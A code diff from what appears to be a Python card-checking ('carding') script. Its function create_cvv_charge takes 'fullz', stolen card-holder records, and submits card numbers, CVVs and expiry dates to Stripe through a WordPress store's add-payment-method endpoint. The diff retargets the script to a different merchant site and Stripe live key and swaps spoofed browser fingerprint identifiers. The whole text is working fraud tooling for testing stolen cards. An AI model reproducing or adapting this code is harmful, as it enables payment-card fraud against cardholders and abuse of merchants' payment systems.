@@ -42,14 +42,14 @@ async def create_cvv_charge(fullz, session):
             'card[cvc]': cvv,
             'card[exp_month]': mes,
             'card[exp_year]': ano,
-            'guid': '8767fe05-30b7-4a3e-b5be-3952943deba3d9e5e9',
-            'muid': '06cd1deb-58df-484a-96b1-9ff05fa13a21d3456a',
-            'sid': '170d3d01-0f16-4509-a427-a79a95cff0433e2fb0',
+            'guid': 'c13855f7-15a5-4028-8920-f51341b4c44d42ae05',
+            'muid': '8d42c9aa-9b82-40fd-aa49-bcd553be19cc6e1a97',
+            'sid': '67acd963-9234-45bf-8c3a-86204d86d3a4188021',
             'pasted_fields': 'number',
             'payment_user_agent': 'stripe.js/2f7b2f7dbc1b; stripe-js-v3/2f7b2f7dbc1b; card-element',
-            'referrer': 'https://lumivoce.org',
-            'time_on_page': '27287',
-            'key': 'pk_live_519sODGHvm9HtpVbGwn3R5HrSXBaErzDUXpjtr2lJvODEXgSV8x7UQnU3fChiIZ6hIwrgM4ubVpp1DFbUDX74ft4pV00G1pMnrpR'
+            'referrer': 'https://sissylover.com/my-account/add-payment-method/',
+            'time_on_page': '48760',
+            'key': 'pk_live_518G6HgBRoi4Zakzj7hzizB84DJGzRPWHatOPXSic41SmKx32hRXNCGhc4jKVLOT5zAcTBc8tiJxko1hW8ofjOg0r00E2xH7YBP'
         }
         logging.info(f"Data payload: {data}")
 
@@ -63,7 +63,7 @@ async def create_cvv_charge(fullz, session):
         logging.info(f"Files: {files}")
 
         response = await session.post(
-            'https://lumivoce.org/wp-admin/admin-ajax.php',
+            'https://sissylover.com/wp-admin/admin-ajax.php',
             data=data, # Use data= for form data
             files=files,
             )
